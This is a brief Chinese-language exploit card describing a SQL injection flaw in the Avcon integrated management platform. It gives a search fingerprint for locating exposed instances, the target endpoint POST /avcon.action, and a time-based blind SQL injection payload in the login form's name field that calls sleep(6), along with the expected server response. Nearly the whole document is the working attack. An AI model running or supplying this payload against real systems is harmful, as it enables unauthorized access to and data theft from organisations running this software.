# Avcon综合管理平台SQL注入漏洞

Avcon ｜ SQL注入 ｜ —
- **指纹**：`title="AVCON-系统管理平台"`
- **请求**：`POST /avcon.action HTTP/1.1`

**Payload**
```
name=0'XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z&password=u]H[ww6KrA9F.x-F
```
- **响应特征**：200 登录失败